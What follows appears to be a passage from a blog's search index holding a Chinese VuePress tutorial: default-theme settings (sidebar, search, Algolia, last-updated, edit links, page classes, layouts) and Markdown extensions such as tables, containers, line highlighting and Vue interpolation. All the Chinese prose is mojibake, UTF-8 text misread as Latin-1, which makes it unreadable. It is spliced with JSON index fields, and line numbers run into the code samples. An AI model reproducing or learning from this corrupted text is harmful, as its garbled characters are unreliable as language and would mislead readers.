è‡ªåŠ¨ç”Ÿæˆä¾§æ å¦‚æœä½ å¸Œæœ›è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªä»…ä»…åŒ…å«äº†å½“å‰é¡µé¢æ ‡é¢˜ï¼ˆheadersï¼‰é“¾æ¥çš„ä¾§è¾¹æ ï¼Œä½ å¯ä»¥é€šè¿‡ YAML Front Matter æ¥å®ç°ï¼ˆä¼˜å…ˆçº§æœ€é«˜ï¼‰ï¼š 123---sidebar: auto--- ä½ ä¹Ÿå¯ä»¥é€šè¿‡é…ç½®æ¥åœ¨æ‰€æœ‰é¡µé¢ä¸­å¯ç”¨å®ƒï¼š 123456// .vuepress/config.jsmodule.exports = { themeConfig: { sidebar: 'auto' }} åœ¨ å¤šè¯­è¨€ æ¨¡å¼ä¸‹ï¼Œä½ ä¹Ÿå¯ä»¥å°†å…¶åº”ç”¨åˆ°æŸä¸€ç‰¹å®šçš„è¯­è¨€ä¸‹ï¼š 12345678// .vuepress/config.jsmodule.exports = { themeConfig: { '/zh/': { sidebar: 'auto' } }} æ³¨æ„ï¼šè‡ªåŠ¨ç”Ÿæˆçš„ä¾§è¾¹æ ï¼Œé»˜è®¤æ”¯æŒå¤šçº§æ˜¾ç¤ºï¼ˆä¸¤çº§ä»¥ä¸Šï¼‰ ç¦ç”¨ä¾§è¾¹æ ä½ å¯ä»¥é€šè¿‡ YAML Front Matter æ¥ç¦ç”¨æŒ‡å®šé¡µé¢çš„ä¾§è¾¹æ ï¼š 123---sidebar: false--- æœç´¢æ¡†å†…ç½®æœç´¢ä½ å¯ä»¥é€šè¿‡è®¾ç½® themeConfig.search: false æ¥ç¦ç”¨é»˜è®¤çš„æœç´¢æ¡†ï¼Œæˆ–æ˜¯é€šè¿‡ themeConfig.searchMaxSuggestions æ¥è°ƒæ•´é»˜è®¤æœç´¢æ¡†æ˜¾ç¤ºçš„æœç´¢ç»“æœæ•°é‡ï¼š 1234567// .vuepress/config.jsmodule.exports = { themeConfig: { search: false, searchMaxSuggestions: 10 }} ä½ å¯ä»¥é€šè¿‡åœ¨é¡µé¢çš„ Front Matter ä¸­è®¾ç½® tags æ¥ä¼˜åŒ–æœç´¢ç»“æœï¼š 123456---tags: - é…ç½® - ä¸»é¢˜ - ç´¢å¼•--- ä½ å¯ä»¥é€šè¿‡åœ¨é¡µé¢çš„ Front Matter ä¸­è®¾ç½® search æ¥å¯¹å•ç‹¬çš„é¡µé¢ç¦ç”¨å†…ç½®çš„æœç´¢æ¡†ï¼š 123---search: false--- æç¤ºï¼š å¦‚æœä½ éœ€è¦å…¨æ–‡æœç´¢ï¼Œä½ å¯ä»¥ä½¿ç”¨ Algolia æœç´¢ å†…ç½®æœç´¢åªä¼šä¸ºé¡µé¢çš„æ ‡é¢˜ã€h2 ã€ h3 ä»¥åŠ tags æ„å»ºæœç´¢ç´¢å¼• Algolia æœç´¢å¦‚æœéœ€è¦å…¨æ–‡æœç´¢ï¼Œä½ å¯ä»¥é€šè¿‡ themeConfig.algolia é€‰é¡¹æ¥ä½¿ç”¨ Algolia æœç´¢ æ›¿æ¢å†…ç½®çš„æœç´¢æ¡†ã€‚è¦å¯ç”¨ Algolia æœç´¢ï¼Œä½ éœ€è¦è‡³å°‘æä¾› apiKey å’Œ indexNameï¼š 123456789// .vuepress/config.jsmodule.exports = { themeConfig: { algolia: { apiKey: '&lt;API_KEY&gt;', indexName: '&lt;INDEX_NAME&gt;' } }} ä¸åŒäºå¼€ç®±å³ç”¨çš„ å†…ç½®æœç´¢ï¼ŒAlgolia æœç´¢ éœ€è¦ä½ åœ¨ä½¿ç”¨ä¹‹å‰å°†ä½ çš„ç½‘ç«™æäº¤ç»™å®ƒä»¬ç”¨äºåˆ›å»ºç´¢å¼•ï¼Œæ›´å¤šé€‰é¡¹è¯·å‚è€ƒ Algolia DocSearch çš„å®˜æ–¹æ–‡æ¡£ã€‚ æœ€åæ›´æ–°æ—¶é—´ä½ å¯ä»¥é€šè¿‡ themeConfig.lastUpdated é€‰é¡¹æ¥è·å–æ¯ä¸ªæ–‡ä»¶æœ€åä¸€æ¬¡ git æäº¤çš„ UNIX æ—¶é—´æˆ³ï¼ˆmsï¼‰ï¼ŒåŒæ—¶å®ƒå°†ä»¥åˆé€‚çš„æ—¥æœŸæ ¼å¼æ˜¾ç¤ºåœ¨æ¯ä¸€é¡µçš„åº•éƒ¨ï¼š 123456// .vuepress/config.jsmodule.exports = { themeConfig: { lastUpdated: 'Last Updated', // string | boolean }} è¯·æ³¨æ„ï¼ŒthemeConfig.lastUpdated é»˜è®¤æ˜¯å…³é—­çš„ï¼Œå¦‚æœç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šä½œä¸ºå‰ç¼€æ˜¾ç¤ºï¼ˆé»˜è®¤å€¼æ˜¯ï¼šLast Updatedï¼‰ã€‚ç”±äº lastUpdated æ˜¯åŸºäº git çš„ï¼Œæ‰€ä»¥ä½ åªèƒ½åœ¨ä¸€ä¸ªåŸºäº git çš„é¡¹ç›®ä¸­å¯ç”¨å®ƒã€‚æ­¤å¤–ï¼Œç”±äºä½¿ç”¨çš„æ—¶é—´æˆ³æ¥è‡ª git commitï¼Œå› æ­¤å®ƒå°†ä»…åœ¨ç»™å®šé¡µçš„ç¬¬ä¸€æ¬¡æäº¤ä¹‹åæ˜¾ç¤ºï¼Œå¹¶ä¸”ä»…åœ¨è¯¥é¡µé¢åç»­æäº¤æ›´æ”¹æ—¶æ›´æ–°ã€‚ å‚è€ƒ: @vuepress/plugin-last-updated ä¸Š / ä¸‹ä¸€ç¯‡é“¾æ¥ä¸Šä¸€ç¯‡å’Œä¸‹ä¸€ç¯‡æ–‡ç« çš„é“¾æ¥å°†ä¼šè‡ªåŠ¨åœ°æ ¹æ®å½“å‰é¡µé¢çš„ä¾§è¾¹æ çš„é¡ºåºæ¥è·å–ã€‚ ä½ å¯ä»¥é€šè¿‡ themeConfig.nextLinks å’Œ themeConfig.prevLinks æ¥å…¨å±€ç¦ç”¨å®ƒä»¬ï¼š 123456789// .vuepress/config.jsmodule.exports = { themeConfig: { // é»˜è®¤å€¼æ˜¯ true ã€‚è®¾ç½®ä¸º false æ¥ç¦ç”¨æ‰€æœ‰é¡µé¢çš„ ä¸‹ä¸€ç¯‡ é“¾æ¥ nextLinks: false, // é»˜è®¤å€¼æ˜¯ true ã€‚è®¾ç½®ä¸º false æ¥ç¦ç”¨æ‰€æœ‰é¡µé¢çš„ ä¸Šä¸€ç¯‡ é“¾æ¥ prevLinks: false }} ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ YAML Front Matter æ¥æ˜ç¡®åœ°é‡å†™æˆ–è€…ç¦ç”¨å®ƒä»¬ï¼š 1234---prev: ./some-other-pagenext: false--- Git ä»“åº“å’Œç¼–è¾‘é“¾æ¥å½“ä½ æä¾›äº† themeConfig.repo é€‰é¡¹ï¼Œå°†ä¼šè‡ªåŠ¨åœ¨æ¯ä¸ªé¡µé¢çš„å¯¼èˆªæ ç”Ÿæˆç”Ÿæˆä¸€ä¸ª GitHub é“¾æ¥ï¼Œä»¥åŠåœ¨é¡µé¢çš„åº•éƒ¨ç”Ÿæˆä¸€ä¸ª \"Edit this page\" é“¾æ¥ã€‚ 1234567891011121314151617181920212223// .vuepress/config.jsmodule.exports = { themeConfig: { // å‡å®šæ˜¯ GitHub. åŒæ—¶ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„ GitLab URL repo: 'vuejs/vuepress', &nbsp; &nbsp;// è‡ªå®šä¹‰ä»“åº“é“¾æ¥æ–‡å­—ã€‚é»˜è®¤ä» `themeConfig.repo` ä¸­è‡ªåŠ¨æ¨æ–­ä¸º &nbsp; &nbsp;// \"GitHub\"/\"GitLab\"/\"Bitbucket\" å…¶ä¸­ä¹‹ä¸€ï¼Œæˆ–æ˜¯ \"Source\"ã€‚ &nbsp; &nbsp;repoLabel: 'æŸ¥çœ‹æºç ', &nbsp; &nbsp;// ä»¥ä¸‹ä¸ºå¯é€‰çš„ç¼–è¾‘é“¾æ¥é€‰é¡¹ &nbsp; &nbsp;// å‡å¦‚ä½ çš„æ–‡æ¡£ä»“åº“å’Œé¡¹ç›®æœ¬èº«ä¸åœ¨ä¸€ä¸ªä»“åº“ï¼š &nbsp; &nbsp;docsRepo: 'vuejs/vuepress', &nbsp; &nbsp;// å‡å¦‚æ–‡æ¡£ä¸æ˜¯æ”¾åœ¨ä»“åº“çš„æ ¹ç›®å½•ä¸‹ï¼š &nbsp; &nbsp;docsDir: 'docs', &nbsp; &nbsp;// å‡å¦‚æ–‡æ¡£æ”¾åœ¨ä¸€ä¸ªç‰¹å®šçš„åˆ†æ”¯ä¸‹ï¼š &nbsp; &nbsp;docsBranch: 'master', // é»˜è®¤æ˜¯ false, è®¾ç½®ä¸º true æ¥å¯ç”¨ editLinks: true, // é»˜è®¤ä¸º \"Edit this page\" editLinkText: 'å¸®åŠ©æˆ‘ä»¬æ”¹å–„æ­¤é¡µé¢ï¼' }} ä½ å¯ä»¥é€šè¿‡ YAML front matter æ¥ç¦ç”¨æŒ‡å®šé¡µé¢çš„ç¼–è¾‘é“¾æ¥ï¼š 123---editLink: false--- é¡µé¢æ»šåŠ¨ä½ å¯ä»¥é€šè¿‡ themeConfig.smoothScroll é€‰é¡¹æ¥å¯ç”¨é¡µé¢æ»šåŠ¨æ•ˆæœï¼š 123456// .vuepress/config.jsmodule.exports = { themeConfig: { smoothScroll: true }} è‡ªå®šä¹‰é¡µé¢ç±»ï¼ˆCSSï¼‰æœ‰æ—¶å€™ä½ å¯èƒ½éœ€è¦ä¸ºç‰¹å®šé¡µé¢æ·»åŠ ä¸€ä¸ª CSS ç±»åï¼Œä»¥æ–¹ä¾¿é’ˆå¯¹è¯¥é¡µé¢æ·»åŠ ä¸€äº›ä¸“é—¨çš„ CSSã€‚è¿™ç§æƒ…å†µä¸‹ä½ å¯ä»¥åœ¨è¯¥é¡µé¢çš„ YAML Front Matter ä¸­å£°æ˜ä¸€ä¸ª pageClassï¼š 123---pageClass: custom-page-class--- åªèƒ½åœ¨ .vuepress/styles/index.styl ä¸­ç¼–å†™é’ˆå¯¹è¯¥é¡µé¢çš„ CSS ï¼š 12345/* .vuepress/styles/index.styl */.theme-container.custom-page-class { /* ç‰¹å®šé¡µé¢çš„ CSS */} è‡ªå®šä¹‰æ ·å¼åº”è¯¥å†™åœ¨ index.styl å†…ï¼Œè¯¥æ–‡ä»¶å¯ä»¥è®©ä½ æ–¹ä¾¿åœ°æ·»åŠ æˆ–è¦†ç›–æ ·å¼ ç‰¹å®šé¡µé¢çš„è‡ªå®šä¹‰å¸ƒå±€é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ª *.md æ–‡ä»¶å°†ä¼šè¢«æ¸²æŸ“åœ¨ä¸€ä¸ª &lt;div class=\"page\"&gt; å®¹å™¨ä¸­ï¼ŒåŒæ—¶è¿˜æœ‰ä¾§è¾¹æ ã€è‡ªåŠ¨ç”Ÿæˆçš„ç¼–è¾‘é“¾æ¥ï¼Œä»¥åŠä¸Š / ä¸‹ä¸€ç¯‡æ–‡ç« çš„é“¾æ¥ã€‚å¦‚æœä½ æƒ³è¦ä½¿ç”¨ä¸€ä¸ªå®Œå…¨è‡ªå®šä¹‰çš„ç»„ä»¶æ¥ä»£æ›¿å½“å‰çš„é¡µé¢ï¼ˆè€Œåªä¿ç•™å¯¼èˆªæ ï¼‰ï¼Œä½ å¯ä»¥å†æ¬¡ä½¿ç”¨ YAML Front Matter æ¥æŒ‡å®šè¿™ä¸ªç»„ä»¶ã€‚ 123---layout: SpecialLayout--- è¿™å°†ä¼šä¸ºå½“å‰çš„é¡µé¢æ¸²æŸ“ .vuepress/components/SpecialLayout.vue å¸ƒå±€ã€‚ ä¸‹ç¯‡ - VuePress å…¥é—¨æ•™ç¨‹ä¹‹å›› VuePress å…¥é—¨æ•™ç¨‹ä¹‹å››æ’ä»¶ç¯‡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"å…¨æ ˆæŠ€æœ¯é©¿ç«™\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"type\": \"hexo\", \"random\": \"0.9\", \"interval\": \"30\", \"expires\": \"365\", \"height\": \"auto\" }); } catch(e) { console.warn(\"readmore plugin occurred error: \" + e.name + \" | \" + e.message); } }",tags:"é™æ€åšå®¢"},{title:"VuePress å…¥é—¨æ•™ç¨‹ä¹‹äºŒ Markdown ç¯‡",url:"/posts/b693c9f4.html",text:'å‰è¨€VuePress ä¸Šç¯‡ VuePress å…¥é—¨æ•™ç¨‹ä¹‹ä¸€å¿«é€Ÿå…¥é—¨ç¯‡ VuePress ç«™ç‚¹ VuePress å®˜æ–¹æ–‡æ¡£ VuePress ä¸­æ–‡æ–‡æ¡£ VuePress Github é¡¹ç›® Markdown æ‰©å±•Header Anchorsæ‰€æœ‰çš„æ ‡é¢˜å°†ä¼šè‡ªåŠ¨åœ°åº”ç”¨ anchor é“¾æ¥ï¼Œanchor çš„æ¸²æŸ“å¯ä»¥é€šè¿‡ markdown.anchor æ¥é…ç½®ã€‚ é“¾æ¥å†…éƒ¨é“¾æ¥ç½‘ç«™å†…éƒ¨çš„é“¾æ¥ï¼Œå°†ä¼šè¢«è½¬æ¢æˆ &lt;router-link&gt; ç”¨äº SPA å¯¼èˆªã€‚åŒæ—¶ï¼Œç«™å†…çš„æ¯ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„ README.md æˆ–è€… index.md æ–‡ä»¶éƒ½ä¼šè¢«è‡ªåŠ¨ç¼–è¯‘ä¸º index.htmlï¼Œå¯¹åº”çš„é“¾æ¥å°†è¢«è§†ä¸º /ã€‚ ä»¥å¦‚ä¸‹çš„æ–‡ä»¶ç»“æ„ä¸ºä¾‹ï¼š 12345678910.â”œâ”€ README.mdâ”œâ”€ fooâ”‚&nbsp;&nbsp;â”œâ”€ README.mdâ”‚ â”œâ”€ one.mdâ”‚ â””â”€ two.mdâ””â”€ bar â”œâ”€ README.md â”œâ”€ three.md â””â”€ four.md å‡è®¾ä½ ç°åœ¨ä½äº foo/one.md ä¸­ï¼š 12345[Home](/) &lt;!-- è·³è½¬åˆ°æ ¹éƒ¨çš„ README.md --&gt;[foo](/foo/) &lt;!-- è·³è½¬åˆ° foo æ–‡ä»¶å¤¹çš„ index.html --&gt;[foo heading](./#heading) &lt;!-- è·³è½¬åˆ° foo/index.html çš„ç‰¹å®šæ ‡é¢˜ä½ç½® --&gt;[bar - three](../bar/three.md) &lt;!-- å…·ä½“æ–‡ä»¶å¯ä»¥ä½¿ç”¨ .md ç»“å°¾ï¼ˆæ¨èï¼‰ --&gt;[bar - four](../bar/four.html) &lt;!-- ä¹Ÿå¯ä»¥ç”¨ .html --&gt; é“¾æ¥çš„é‡å®šå‘VuePress æ”¯æŒé‡å®šå‘åˆ°å¹²å‡€é“¾æ¥ã€‚å¦‚æœä¸€ä¸ªé“¾æ¥ /foo æ‰¾ä¸åˆ°ï¼ŒVuePress ä¼šè‡ªè¡Œå¯»æ‰¾ä¸€ä¸ªå¯ç”¨çš„ /foo/ æˆ– /foo.htmlã€‚åè¿‡æ¥ï¼Œå½“ /foo/ æˆ– /foo.html ä¸­çš„ä¸€ä¸ªæ‰¾ä¸åˆ°æ—¶ï¼ŒVuePress ä¹Ÿä¼šå°è¯•å¯»æ‰¾å¦ä¸€ä¸ªã€‚å€ŸåŠ©è¿™ç§ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®˜æ–¹æ’ä»¶ vuepress-plugin-clean-urls å®šåˆ¶ä½ çš„ç½‘ç«™è·¯å¾„ã€‚ Tip æ³¨æ„ï¼šæ— è®ºæ˜¯å¦ä½¿ç”¨äº† permalink å’Œ clean-urls æ’ä»¶ï¼Œä½ çš„ç›¸å¯¹è·¯å¾„éƒ½åº”è¯¥ä¾èµ–äºå½“å‰çš„æ–‡ä»¶ç»“æ„æ¥å®šä¹‰ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå³ä½¿ä½ å°† /foo/one.md çš„è·¯å¾„è®¾ä¸ºäº† /foo/one/ï¼Œä½ ä¾ç„¶åº”è¯¥é€šè¿‡ ./two.md æ¥è®¿é—® /foo/two.md é¡µé¢åç¼€é»˜è®¤æƒ…å†µä¸‹ï¼Œé¡µé¢å’Œå†…éƒ¨é“¾æ¥æ˜¯ä»¥ .html åç¼€ç”Ÿæˆï¼Œå¯ä»¥é€šè¿‡è®¾ç½® config.markdown.pageSuffix æ¥è‡ªå®šä¹‰å®ƒã€‚ å¤–éƒ¨é“¾æ¥å¤–éƒ¨çš„é“¾æ¥å°†ä¼šè¢«è‡ªåŠ¨åœ°è®¾ç½®ä¸º target="_blank" rel="noopener noreferrer": 12- [vuejs.org](https://vuejs.org)- [VuePress on GitHub](https://github.com/vuejs/vuepress) ä½ å¯ä»¥è‡ªå®šä¹‰é€šè¿‡é…ç½® config.markdown.externalLinks æ¥è‡ªå®šä¹‰å¤–éƒ¨é“¾æ¥çš„ç‰¹æ€§ã€‚ Front MatterVuePress æä¾›äº†å¯¹ YAML Front Matter å¼€ç®±å³ç”¨çš„æ”¯æŒ: 1234---title: Blogging Like a Hackerlang: en-US--- è¿™äº›æ•°æ®å¯ä»¥åœ¨å½“å‰ Markdown çš„æ­£æ–‡ï¼Œæˆ–è€…æ˜¯ä»»æ„çš„è‡ªå®šä¹‰æˆ–ä¸»é¢˜ç»„ä»¶ä¸­ä½¿ç”¨ã€‚æƒ³äº†è§£æ›´å¤šï¼Œè¯·ç§»æ­¥ Front Matterã€‚ Github é£æ ¼çš„è¡¨æ ¼è¾“å…¥å†…å®¹ 12345| Tables | Are | Cool || ------------- |:-------------:| -----:|| col 3 is | right-aligned | $1600 || col 2 is | centered | $12 || zebra stripes | are neat | $1 | è¾“å‡ºæ•ˆæœ Emoji è¡¨æƒ…è¾“å…¥å†…å®¹ 1:tada: :100: è¾“å‡ºæ•ˆæœ ä½ å¯ä»¥åœ¨è¿™ä¸ªåˆ—è¡¨æ‰¾åˆ°æ‰€æœ‰å¯ç”¨çš„ Emoji è¡¨æƒ…ã€‚ æ–‡æ¡£ç›®å½•è¾“å…¥å†…å®¹ 1[[toc]] è¾“å‡ºæ•ˆæœ ç›®å½•ï¼ˆTable of Contentsï¼‰çš„æ¸²æŸ“å¯ä»¥é€šè¿‡ markdown.toc é€‰é¡¹æ¥é…ç½®ã€‚ è‡ªå®šä¹‰å®¹å™¨ Warning æ³¨æ„ï¼šè‡ªå®šä¹‰å®¹å™¨åªé’ˆå¯¹ VuePress çš„é»˜è®¤ä¸»é¢˜æœ‰æ•ˆã€‚ è¾“å…¥å†…å®¹ 123456789101112131415::: tipè¿™æ˜¯ä¸€ä¸ªæç¤º:::::: warningè¿™æ˜¯ä¸€ä¸ªè­¦å‘Š:::::: dangerè¿™æ˜¯ä¸€ä¸ªå±é™©è­¦å‘Š:::::: detailsè¿™æ˜¯ä¸€ä¸ªè¯¦æƒ…å—ï¼Œåœ¨ IE / Edge ä¸­ä¸ç”Ÿæ•ˆ::: è¾“å‡ºæ•ˆæœ ä»£ç å—ä¸­çš„è¯­æ³•é«˜äº®VuePress ä½¿ç”¨äº† Prism æ¥ä¸º Markdown ä¸­çš„ä»£ç å—å®ç°è¯­æ³•é«˜äº®ã€‚Prism æ”¯æŒå¤§é‡çš„ç¼–ç¨‹è¯­è¨€ï¼Œä½ éœ€è¦åšçš„åªæ˜¯åœ¨ä»£ç å—çš„å¼€å§‹å€’å‹¾ä¸­é™„åŠ ä¸€ä¸ªæœ‰æ•ˆçš„è¯­è¨€åˆ«åï¼š è¾“å…¥å†…å®¹ 12345678910``` html&lt;ul&gt; &lt;li v-for="todo in todos" :key="todo.id" &gt; {{ todo.text }} &lt;/li&gt;&lt;/ul&gt;``` è¾“å‡ºæ•ˆæœ åœ¨ Prism çš„ç½‘ç«™ä¸ŠæŸ¥çœ‹ åˆæ³•çš„è¯­è¨€åˆ—è¡¨ã€‚ ä»£ç å—ä¸­çš„è¡Œé«˜äº®è¾“å…¥å†…å®¹ 123456789``` js {4}export default { data () { return { msg: \'Highlighted!\' } }}``` è¾“å‡ºæ•ˆæœ é™¤äº†å•è¡Œä»¥å¤–ï¼Œä½ ä¹Ÿå¯æŒ‡å®šå¤šè¡Œï¼Œè¡Œæ•°åŒºé—´ï¼Œæˆ–æ˜¯ä¸¤è€…éƒ½æŒ‡å®šã€‚ è¡Œæ•°åŒºé—´ï¼šä¾‹å¦‚ {5-8}, {3-10}, {10-17} å¤šä¸ªå•è¡Œï¼šä¾‹å¦‚ {4,7,9} è¡Œæ•°åŒºé—´ä¸å¤šä¸ªå•è¡Œï¼šä¾‹å¦‚ {4,7-13,16,23-27,40} è¾“å…¥å†…å®¹ 12345678910111213``` js{1,4,6-7}export default { // Highlighted data () { return { msg: `Highlighted! This line isn\'t highlighted, but this and the next 2 are.`, motd: \'VuePress is awesome\', lorem: \'ipsum\', } }}``` è¾“å‡ºæ•ˆæœ ä»£ç å—è¡Œå·æ˜¾ç¤ºä½ å¯ä»¥é€šè¿‡é…ç½®æ¥ä¸ºæ¯ä¸ªä»£ç å—æ˜¾ç¤ºè¡Œå·ï¼š 12345module.exports = { markdown: { lineNumbers: true }} æ˜¾ç¤ºæ•ˆæœï¼š ä»£ç å—ç‰‡æ®µå¯¼å…¥ä½ å¯ä»¥é€šè¿‡ä¸‹è¿°çš„è¯­æ³•ï¼Œåœ¨ Markdown æ–‡ä»¶ä¸­å¯¼å…¥å·²ç»å­˜åœ¨çš„å…¶ä»–æ–‡ä»¶ä¸­çš„ä»£ç æ®µï¼š 1&lt;&lt;&lt; @/filepath å®ƒä¹Ÿæ”¯æŒ è¡Œé«˜äº®ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š 1&lt;&lt;&lt; @/filepath{highlightLines} è¾“å…¥å†…å®¹ 1&lt;&lt;&lt; @/../@vuepress/markdown/__tests__/fragments/snippet.js{2} è¾“å‡ºæ•ˆæœ Tip æ³¨æ„ï¼šç”±äºä»£ç æ®µçš„å¯¼å…¥å°†åœ¨ Webpack ç¼–è¯‘ä¹‹å‰æ‰§è¡Œï¼Œå› æ­¤ä½ æ— æ³•ä½¿ç”¨ Webpack ä¸­çš„è·¯å¾„åˆ«åï¼Œæ­¤å¤„çš„ @ é»˜è®¤å€¼æ˜¯ process.cwd() ä¸ºäº†åªå¯¼å…¥å¯¹åº”éƒ¨åˆ†çš„ä»£ç ï¼Œä½ ä¹Ÿå¯è¿ç”¨ VS Code Regionã€‚ä½ å¯ä»¥åœ¨æ–‡ä»¶è·¯å¾„åæ–¹çš„ # ç´§æ¥ç€æä¾›ä¸€ä¸ªè‡ªå®šä¹‰çš„åŒºåŸŸåç§°ï¼ˆé¢„è®¾ä¸º snippet ï¼‰ ä»£ç æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132// #region snippetfunction foo () { return ({ dest: \'../../vuepress\', locales: { \'/\': { lang: \'en-US\', title: \'VuePress\', description: \'Vue-powered Static Site Generator\' }, \'/zh/\': { lang: \'zh-CN\', title: \'VuePress\', description: \'Vue é©±åŠ¨çš„é™æ€ç½‘ç«™ç”Ÿæˆå™¨\' } }, head: [ [\'link\', { rel: \'icon\', href: `/logo.png` }], [\'link\', { rel: \'manifest\', href: \'/manifest.json\' }], [\'meta\', { name: \'theme-color\', content: \'#3eaf7c\' }], [\'meta\', { name: \'apple-mobile-web-app-capable\', content: \'yes\' }], [\'meta\', { name: \'apple-mobile-web-app-status-bar-style\', content: \'black\' }], [\'link\', { rel: \'apple-touch-icon\', href: `/icons/apple-touch-icon-152x152.png` }], [\'link\', { rel: \'mask-icon\', href: \'/icons/safari-pinned-tab.svg\', color: \'#3eaf7c\' }], [\'meta\', { name: \'msapplication-TileImage\', content: \'/icons/msapplication-icon-144x144.png\' }], [\'meta\', { name: \'msapplication-TileColor\', content: \'#000000\' }] ] })}// #endregion snippetexport default foo è¾“å…¥å†…å®¹ 1&lt;&lt;&lt; @/../@vuepress/markdown/__tests__/fragments/snippet-with-region.js#snippet{1} è¾“å‡ºæ•ˆæœ è¿›é˜¶é…ç½®VuePress ä½¿ç”¨ markdown-it æ¥æ¸²æŸ“ Markdownï¼Œä¸Šè¿°å¤§å¤šæ•°çš„æ‹“å±•ä¹Ÿéƒ½æ˜¯é€šè¿‡è‡ªå®šä¹‰çš„æ’ä»¶å®ç°çš„ã€‚æƒ³è¦è¿›ä¸€æ­¥çš„è¯ï¼Œä½ å¯ä»¥é€šè¿‡ .vuepress/config.js çš„ markdown é€‰é¡¹ï¼Œæ¥å¯¹å½“å‰çš„ markdown-it å®ä¾‹åšä¸€äº›è‡ªå®šä¹‰çš„é…ç½®ï¼š 123456789101112module.exports = { markdown: { // markdown-it-anchor çš„é€‰é¡¹ anchor: { permalink: false }, // markdown-it-toc çš„é€‰é¡¹ toc: { includeLevel: [1, 2] }, extendMarkdown: md =&gt; { &nbsp; &nbsp; &nbsp;// ä½¿ç”¨æ›´å¤šçš„ markdown-it æ’ä»¶! md.use(require(\'markdown-it-xxx\')) } }} åœ¨ Markdown ä¸­ ä½¿ç”¨ Vueæµè§ˆå™¨çš„ API è®¿é—®é™åˆ¶å½“ä½ åœ¨å¼€å‘ä¸€ä¸ª VuePress åº”ç”¨æ—¶ï¼Œç”±äºæ‰€æœ‰çš„é¡µé¢åœ¨ç”Ÿæˆé™æ€ HTML æ—¶éƒ½éœ€è¦é€šè¿‡ Node.js æœåŠ¡ç«¯æ¸²æŸ“ï¼Œå› æ­¤æ‰€æœ‰çš„ Vue ç›¸å…³ä»£ç éƒ½åº”å½“éµå¾ª ç¼–å†™é€šç”¨ä»£ç  çš„è¦æ±‚ã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¯·ç¡®ä¿åªåœ¨ beforeMount æˆ–è€… mounted è®¿é—®æµè§ˆå™¨ DOM çš„ APIã€‚ å¦‚æœä½ æ­£åœ¨ä½¿ç”¨ï¼Œæˆ–è€…éœ€è¦å±•ç¤ºä¸€ä¸ªå¯¹äº SSR ä¸æ€ä¹ˆå‹å¥½çš„ç»„ä»¶ï¼ˆæ¯”å¦‚åŒ…å«äº†è‡ªå®šä¹‰æŒ‡ä»¤ï¼‰ï¼Œä½ å¯ä»¥å°†å®ƒä»¬åŒ…è£¹åœ¨å†…ç½®çš„ &lt;ClientOnly&gt; ç»„ä»¶ä¸­ï¼š 123&lt;ClientOnly&gt; &lt;NonSSRFriendlyComponent/&gt;&lt;/ClientOnly&gt; è¯·æ³¨æ„ï¼Œè¿™å¹¶ä¸èƒ½è§£å†³ä¸€äº›ç»„ä»¶æˆ–åº“åœ¨å¯¼å…¥æ—¶å°±è¯•å›¾è®¿é—®æµè§ˆå™¨ API çš„é—®é¢˜ â€”â€” å¦‚æœéœ€è¦ä½¿ç”¨è¿™æ ·çš„ç»„ä»¶æˆ–åº“ï¼Œä½ éœ€è¦åœ¨åˆé€‚çš„ç”Ÿå‘½å‘¨æœŸé’©å­ä¸­åŠ¨æ€å¯¼å…¥å®ƒä»¬ï¼š 123456789&lt;script&gt;export default { mounted () { import(\'./lib-that-access-window-on-import\').then(module =&gt; { // use code }) }}&lt;/script&gt; å¦‚æœä½ çš„æ¨¡å—é€šè¿‡ export default å¯¼å‡ºä¸€ä¸ª Vue ç»„ä»¶ï¼Œé‚£ä¹ˆä½ å¯ä»¥åŠ¨æ€æ³¨å†Œå®ƒï¼š 1234567891011121314151617&lt;template&gt; &lt;component v-if="dynamicComponent" :is="dynamicComponent"&gt;&lt;/component&gt;&lt;/template&gt;&lt;script&gt;export default { data() { return { dynamicComponent: null } }, mounted () { import(\'./lib-that-access-window-on-import\').then(module =&gt; { this.dynamicComponent = module.default }) }}&lt;/script&gt; å‚è€ƒï¼š Vue.js &gt; åŠ¨æ€ç»„ä»¶ æ¨¡æ¿è¯­æ³•æ’å€¼æ¯ä¸€ä¸ª Markdown æ–‡ä»¶å°†é¦–å…ˆè¢«ç¼–è¯‘æˆ HTMLï¼Œæ¥ç€ä½œä¸ºä¸€ä¸ª Vue ç»„ä»¶ä¼ å…¥ vue-loaderï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥åœ¨æ–‡æœ¬ä¸­ä½¿ç”¨ Vue é£æ ¼çš„æ’å€¼ï¼š è¾“å…¥å†…å®¹ 1{{ 1 + 1 }} è¾“å‡ºæ•ˆæœ 12 æŒ‡ä»¤åŒæ ·åœ°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æŒ‡ä»¤: è¾“å…¥å†…å®¹ 1&lt;span v-for="i in 3"&gt;{{ i }} &lt;/span&gt; è¾“å‡ºæ•ˆæœ 11 2 3 è®¿é—®ç½‘ç«™ä»¥åŠé¡µé¢çš„æ•°æ®ç¼–è¯‘åçš„ç»„ä»¶æ²¡æœ‰ç§æœ‰æ•°æ®ï¼Œä½†å¯ä»¥è®¿é—® ç½‘ç«™çš„å…ƒæ•°æ®ï¼Œä¸¾ä¾‹æ¥è¯´ï¼š è¾“å…¥å†…å®¹ 1{{ $page }} è¾“å‡ºæ•ˆæœ 12345{ "path": "/using-vue.html", "title": "Using Vue in Markdown", "frontmatter": {}} 